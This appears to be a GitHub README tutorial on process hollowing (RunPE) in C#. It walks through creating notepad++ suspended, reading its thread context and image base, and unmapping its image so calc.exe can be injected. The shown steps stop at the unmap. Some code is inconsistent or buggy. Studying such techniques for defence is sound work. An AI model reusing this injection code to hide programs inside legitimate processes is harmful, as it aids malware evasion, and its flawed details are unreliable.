# ProcessInjector.NET
Learning Process Hollowing technique


# TLDR

I want to try to inject a `calculator.exe` into `notepad++.exe` using the `Process Hollowing` technique.

- [Overview of  Process Hollowing aka (Process Replacement/RunPE)](#overview-of--process-hollowing-aka--process-replacement-runpe-)
- [Creating our Victim Process](#creating-our-victim-process)
  * [CreateProcessA Parameters](#createprocessa-parameters)
    + [lpApplicationName](#lpapplicationname)
    + [lpCommandLine](#lpcommandline)
    + [lpProcessAttributes](#lpprocessattributes)
    + [lpThreadAttributes](#lpthreadattributes)
    + [bInheritHandles](#binherithandles)
    + [dwCreationFlags](#dwcreationflags)
    + [lpEnvironment](#lpenvironment)
    + [lpStartupInfo](#lpstartupinfo)
    + [lpProcessInformation](#lpprocessinformation)
  * [Code Example](#code-example)
- [Getting ThreadContext](#getting-threadcontext)
  * [GetThreadContext Parameters](#getthreadcontext-parameters)
    + [hThread](#hthread)
    + [lpContext](#lpcontext)
  * [Code Example](#code-example-1)
- [Getting ImageBase from our victim process](#getting-imagebase-from-our-victim-process)
  * [ReadProcessMemory Parameters](#readprocessmemory-parameters)
    + [hProcess](#hprocess)
    + [lpBaseAddress](#lpbaseaddress)
    + [lpBuffer](#lpbuffer)
    + [nSize](#nsize)
    + [lpNumberOfBytesRead](#lpnumberofbytesread)
  * [Code Example](#code-example-2)
- [Hollowing our Victim Process](#hollowing-our-victim-process)
  * [ZwUnmapViewOfSection Parameters](#zwunmapviewofsection-parameters)
    + [ProcessHandle](#processhandle)
    + [BaseAddress](#baseaddress)
  * [Code Example](#code-example-3)


# Overview of  Process Hollowing aka (Process Replacement/RunPE)

Instead of injecting code into a host program (e.g., DLL injection), malware can perform a technique known as process hollowing. Process hollowing occurs when a malware unmaps (hollows out) the legitimate code from memory of the target process, and overwrites the memory space of the target process (e.g., svchost.exe) with a malicious executable.

![image](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt4bd1c915cefd3848/5e2f90f74c16654538e2ce6a/process-injection-techniques-blogs-runpe.gif)

The malware first creates a new process to host the malicious code in `SUSPENDED` mode. This is done by calling `CreateProcess` and setting the Process Creation Flag to `CREATE_SUSPENDED (0x00000004)`. The primary thread of the new process is created in a suspended state, and does not run until the `ResumeThread` function is called. Next, the malware needs to swap out the contents of the legitimate file with its malicious payload. This is done by unmapping the memory of the target process by calling either `ZwUnmapViewOfSection` or `NtUnmapViewOfSection`. These two APIs basically release all memory pointed to by a section. Now that the memory is unmapped, the loader performs `VirtualAllocEx` to allocate new memory for the malware, and uses `WriteProcessMemory` to write each of the malware’s sections to the target process space. The malware calls `SetThreadContext` to point the `entrypoint` to a new code section that it has written. At the end, the malware resumes the suspended thread by calling `ResumeThread` to take the process out of suspended state.

# Creating our Victim Process

In order to achieve it we are first going to create our victim process, in my case,  `notepad++`, in a `SUSPENDED` state. 
In a `SUSPENDED` state, the victim process is loaded from the filesystem into memory but the primary thread does not run until the `ResumeThread` function is called.

We are going to use the `CreateProcessA` function. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa).

```cpp
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

## CreateProcessA Parameters

### lpApplicationName

This represents the process name that we want to create. Weirdly enough, this can be NULL. In the case where this is NULL, the process name must be the first white space–delimited token in the `lpCommandLine` parameter. 

I will go ahead and leave this parameter to be NULL and specify our process name at `lpCommandLine` parameter instead.

### lpCommandLine

Since our `lpApplicationName` is NULL, the first white space–delimited token of the command line specifies the process name. If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin. Furthermore, if we were to ommit our extension for our process, it will auto append `.exe`. Lets proceed to put the full path of `notepad++.exe`.

```cs
  string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";
```

### lpProcessAttributes

A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new process object can be inherited by child processes. If lpProcessAttributes is NULL, the handle cannot be inherited. 

I will be putting it as NULL.

### lpThreadAttributes

A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new thread object can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited.

I will be putting it as NULL.

### bInheritHandles
If this parameter is TRUE, each inheritable handle in the calling process is inherited by the new process. If the parameter is FALSE, the handles are not inherited.

I will be putting it as FALSE.

### dwCreationFlags

The flags that control the priority class and the creation of the process. For a list of values, see [Process Creation Flags](https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags).

We want to create a `SUSPENDED` process. Thus we will be using the `CREATE_SUSPENDED` flag which has a value `0x4`.

### lpEnvironment

An environment block consists of a null-terminated block of null-terminated strings. Each string is in the following form:

`name=value\0`
We won't be needing it thus we will set it to NULL.

### lpStartupInfo

A pointer to a [STARTUPINFO](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa) structure.

I ported the structure with the help from [PInvoke.Net StartupInfo](https://www.pinvoke.net/default.aspx/Structures/StartupInfo.html?diff=y).


### lpProcessInformation
A pointer to a [PROCESS_INFORMATION](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information) structure that receives identification information about the new process.

I ported the structure with the help from [PInvoke.Net ProcessInformation](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information).

This is a very important structure as we would be using the `process and thread handles` from it.

## Code Example

Let's go ahead and create our victim process in a suspended state.

```cs
static void Main(string[] args)
{
    //Paths to our files
    string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";
    string virusPath = @"C:\Windows\System32\calc.exe";

    byte[] victimFileBytes = File.ReadAllBytes(notepadPath);
    IntPtr victimFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(victimFileBytes, 0);


    byte[] virusFileBytes = File.ReadAllBytes(virusPath);
    IntPtr virusFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(virusFileBytes, 0);

    #region Create Victim Process in Suspended State    
    
    
    PInvoke.STARTUPINFO startupInfo = new PInvoke.STARTUPINFO();
    PInvoke.PROCESS_INFORMATION processInformation = new PInvoke.PROCESS_INFORMATION();

    bool couldNotCreateProcess = !PInvoke.CreateProcess(
                                        lpApplicationName: null,
                                        lpCommandLine: notepadPath,
                                        lpProcessAttributes: IntPtr.Zero,
                                        lpThreadAttributes: IntPtr.Zero,
                                        bInheritHandles: false,
                                        dwCreationFlags: PInvoke.CreationFlags.SUSPENDED,
                                        lpEnvironment: IntPtr.Zero,
                                        lpCurrentDirectory: null,
                                        lpStartupInfo: startupInfo,
                                        lpProcessInformation: processInformation
                                    );
    if (couldNotCreateProcess)
    {
        Console.WriteLine("Failed to create process...");
    }

    Console.WriteLine("Successfully created victim process...");

    #endregion
}
```

![image](https://user-images.githubusercontent.com/12537739/121704357-47d02e00-cb06-11eb-8847-46063bc4c2c2.png)

We have successfully loaded our victim executable to memory, and it is now in a suspended state.

# Getting ThreadContext

The `ThreadContext` contains useful information like the values of the `EntryPoint` or `ImageBase`. These information can easily be obtained from the PE File itself, but it might not always be accurate due to [Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization).

Hence we need to get these values dynamically, once the process has been loaded, in our case, once the process `notepad++.exe` is stalled in the `SUSPENDED` state.

So now how do we get the `ThreadContext`?

We will be utilizing the function `GetThreadContext`. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext).

```cpp
BOOL GetThreadContext(
  HANDLE    hThread,
  LPCONTEXT lpContext
);
```

## GetThreadContext Parameters

### hThread

A handle to the thread whose context is to be retrieved. 

Previously, when we called `CreateProcessA`, we passed in a `lpProcessInformation` which is of type [PROCESS_INFORMATION](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information). The [structure](https://www.pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html) looks as follows in `C#`.

```cs
/// <summary>
/// Contains information about a newly created process and its primary thread. 
/// 
/// <see cref="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information"/>\
/// <seealso cref="https://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html"/>
/// </summary>
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    /// <summary>
    /// A handle to the newly created process. 
    /// The handle is used to specify the process in all functions that perform operations on the process object.
    /// </summary>
    public IntPtr hProcess;

    /// <summary>
    /// A handle to the primary thread of the newly created process. 
    /// The handle is used to specify the thread in all functions that perform operations on the thread object.
    /// </summary>
    public IntPtr hThread;


    public int dwProcessId;
    public int dwThreadId;
}
```

From the above, we can get the handle to the thread using `hThread`.

```cs
IntPtr victimThreadHandle = processInformation.hThread;
```


### lpContext

A pointer to a CONTEXT structure that receives the appropriate context of the specified thread. The value of the ContextFlags member of this structure specifies which portions of a thread's context are retrieved. The CONTEXT structure is highly processor specific. Refer to the WinNT.h header file for processor-specific definitions of this structures and any alignment requirements.

I ported the structure with the help from [PInvoke.Net CONTEXT64](http://www.pinvoke.net/default.aspx/kernel32/GetThreadContext.html).

Next we need to create the context structure specifying `ContextFlags`. The flag to use would be `CONTEXT_FULL` to get the full context data.

```cs
 PInvoke.CONTEXT64 threadContext = new PInvoke.CONTEXT64() { ContextFlags = PInvoke.CONTEXT_FLAGS.CONTEXT_ALL };
```

As the [context](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext) structure needs to be aligned as stated in microsofts documentation,

> Refer to the WinNT.h header file for processor-specific definitions of this structures and any alignment requirements.

```cpp
typedef struct DECLSPEC_ALIGN(16) DECLSPEC_NOINITALL _CONTEXT { ... }
```

The `CONTEXT` structure needs to be 16 bit aligned.

I have created an `Allocate` function which accepts the size of dynamic memory needed and the alignment value.

We now have to allocate unmanaged memory space for the context structure.

```cs
IntPtr pVictimThreadContext = Allocate(Marshal.SizeOf<PInvoke.CONTEXT64>(), 16);
```

Now that we have allocated space, I am going to translate the context from my managed memory structure variable `threadContext` to the unmanaged memory by

```cs
 Marshal.StructureToPtr<PInvoke.CONTEXT64>(victimThreadContext, pVictimThreadContext, false);
```

Once the translation has been performed, we can now call `GetThreadContext` as follows.

```cs
PInvoke.GetThreadContext(victimThreadHandle, pVictimThreadContext);
```
This will fill up all the context details into the unmanaged memory pointer `pVictimeThreadContext`.

For easier reading, I translated the unmanaged memory back to our structure by

```cs
victimThreadContext = Marshal.PtrToStructure<PInvoke.CONTEXT64>(pVictimThreadContext);
```

## Code Example
```cs
IntPtr victimThreadHandle = processInformation.hThread;
            
PInvoke.CONTEXT64 victimThreadContext = new PInvoke.CONTEXT64() { ContextFlags = PInvoke.CONTEXT_FLAGS.CONTEXT_ALL };

IntPtr pVictimThreadContext = Allocate(Marshal.SizeOf<PInvoke.CONTEXT64>(), 16);

Marshal.StructureToPtr<PInvoke.CONTEXT64>(victimThreadContext, pVictimThreadContext, false);

PInvoke.GetThreadContext(victimThreadHandle, pVictimThreadContext);

victimThreadContext = Marshal.PtrToStructure<PInvoke.CONTEXT64>(pVictimThreadContext);
```

# Getting ImageBase from our victim process

Now why did we get the `ThreadContext` of our victim process in the first place? 

It is needed as the context contains details regarding `ImageBase` and `EntryPoint`. Lets tackle the retrieval of `ImageBase`.

Security Researchers found that Rdx was pointing to a memory location. `16 bytes` after it contains the address of the location of ImageBase.

Thus we could get the `ImageBase` location's address by
```cs
ulong rdx = victimThreadContext.Rdx;
ulong victimImageBaseAddress = rdx + 16;
```

Now that we got the address, we can read the `ImageBase` value from it by using the function `ReadProcessMemory`. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory).

```cpp
BOOL ReadProcessMemory(
  HANDLE  hProcess,
  LPCVOID lpBaseAddress,
  LPVOID  lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesRead
);
```

## ReadProcessMemory Parameters

### hProcess

A handle to the process with memory that is being read. 

Just like how we got the `Thread Handle` previously from the `PROCESS_INFORMATION` structure, we can also obtain the `Process Handle` in a similar fashion.

```cs
IntPtr victimProcessHandle = processInformation.hProcess;
```

### lpBaseAddress
A pointer to the base address in the specified process from which to read.

We want to start reading from `victimImageBaseAddress`.

### lpBuffer

A pointer to a buffer that receives the contents from the address space of the specified process.

Let's create `8 bytes` of unamanaged memory to store the `ImageBase`.

```cs
IntPtr victimImageBase = Marshal.AllocHGlobal(8);
```

Then we can perform the read,
```cs
PInvoke.ReadProcessMemory(victimProcessHandle, victimImageBaseAddress, victimImageBase, 8, out _);
```

### nSize

The number of bytes to be read from the specified process.

For 32-bit applications, the `ImageBase` is 4 bytes whereas for 64-bit, its 8 bytes.

We will be reading 8 bytes as this injector is build to support for 64-bit applications.

### lpNumberOfBytesRead
A pointer to a variable that receives the number of bytes transferred into the specified buffer.

For simplicity, I will be ignoring this field by using `C#'s` discard variable, `_`.

## Code Example

```cs
ulong rdx = victimThreadContext.Rdx;
ulong victimImageBaseAddress = rdx + 16;
IntPtr victimProcessHandle = processInformation.hProcess;
IntPtr victimImageBase = Marshal.AllocHGlobal(8);
PInvoke.ReadProcessMemory(victimProcessHandle, victimImageBaseAddress, victimImageBase, 8, out _);
```

# Hollowing our Victim Process

To hollow out our victim process, we need to unmap it from the memory, since its already currently loaded into memory but in a suspended state.

We will be using the function `ZwUnmapViewOfSection`.

More details of it can be found [here](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection).

```cpp
NTSYSAPI NTSTATUS ZwUnmapViewOfSection(
  HANDLE ProcessHandle,
  PVOID  BaseAddress
);
```

## ZwUnmapViewOfSection Parameters

### ProcessHandle

Previously, we called the `CreateProcessA` function. This function helps fill up our `PROCESS_INFORMATION` block.

`PROCESS_INFORMATION` contains the handle to our victim process.

Thus we can get the process handle from it using

```cs
IntPtr processHandle = processInformation.hProcess;
```

### BaseAddress

We have already retrieved the `ImageBase` previously.


## Code Example

```cs
if (PInvoke.ZwUnmapViewOfSection(victimProcessHandle, victimImageBase) == PInvoke.NTSTATUS.STATUS_ACCESS_DENIED)
            {
                Console.WriteLine("Failed to unmap section...");
                return;
            }
```
Pointer to the base virtual address of the view to unmap

![image](https://user-images.githubusercontent.com/12537739/121771500-4bb18e00-cba2-11eb-92b7-034b4aefdd38.png)

As we can see from the image above, we need to get to the `COFF Header`. How do we get to the `COFF Header`? 

At the `DOS_HEADER`, we have a 4 byte integer variable called `E_LFANEW`. This is located at an offset `0x3C` from the start of the file.
Thus to get `E_LFANEW`, 

```cs
Int32 e_lfanew = Marshal.ReadInt32(victimeFilePointer, PInvoke.Offsets.E_LFANEW);
```

`E_LFANEW` contains the offset to get to the `COFF Header`.

Once we get to the `COFF Header`, we can see from the image that the `imagebase` is at `0x34` offset away. However, this is for 32-bit applications. For 64-bit applicaations, there are at a offsett `0x30` away.

Hence to get the `imagebase`, I did

```cs
IntPtr imageBasedAddress = new IntPtr(Marshal.ReadInt64(victimeFilePointer, e_lfanew + 0x30));
```

Now that we have the `processHandle` and `imagebase` address, we can now call the `ZwUnmapViewOfSection` function to unmap our victim process from memory.

```cs
PInvoke.ZwUnmapViewOfSection(processHandle, imageBasedAddress);
```

## Code Example

```cs
static void Main(string[] args)
{
    string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";

    byte[] victimFileBytes = File.ReadAllBytes(notepadPath);
    IntPtr victimeFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(victimFileBytes, 0);

    PInvoke.STARTUPINFO startupInfo = new PInvoke.STARTUPINFO();
    PInvoke.PROCESS_INFORMATION processInformation = new PInvoke.PROCESS_INFORMATION();

    Console.WriteLine("Stage 1");
    Console.WriteLine($"Creating victim process: {notepadPath}");

    bool couldNotCreateProcess = !PInvoke.CreateProcess(
                                        lpApplicationName: null,
                                        lpCommandLine: notepadPath,
                                        lpProcessAttributes: IntPtr.Zero,
                                        lpThreadAttributes: IntPtr.Zero,
                                        bInheritHandles: false,
                                        dwCreationFlags: PInvoke.CreationFlags.SUSPENDED,
                                        lpEnvironment: IntPtr.Zero,
                                        lpCurrentDirectory: null,
                                        lpStartupInfo: startupInfo,
                                        lpProcessInformation: processInformation
                                    );
    if (couldNotCreateProcess)
    {
        Console.WriteLine("Failed to create victim process...");

    }

    Console.WriteLine($"Successfully created victim process...");


    Console.WriteLine("Stage 2");
    Int32 e_lfanew = Marshal.ReadInt32(victimeFilePointer, PInvoke.Offsets.E_LFANEW);
    Console.WriteLine($"Getting handle to process...");
    IntPtr processHandle = processInformation.hProcess;
    Console.WriteLine($"Found E_LFANEW OFFSet: {e_lfanew}...");
    Console.WriteLine($"Getting imageBasedAddress...");
    IntPtr imageBasedAddress = new IntPtr(Marshal.ReadInt64(victimeFilePointer, e_lfanew + 0x30));
    Console.WriteLine("Beginning Process Hollowing...");

    if(PInvoke.ZwUnmapViewOfSection(processHandle, imageBasedAddress) == PInvoke.NTSTATUS.STATUS_ACCESS_DENIED)
    {
        Console.WriteLine("Failed to unmap section...");
        return;
    }

    Console.WriteLine("Successfully unmapped victim process.");
}
```

![image](https://user-images.githubusercontent.com/12537739/121773946-dfd72180-cbb1-11eb-9338-3ca73ea97228.png)
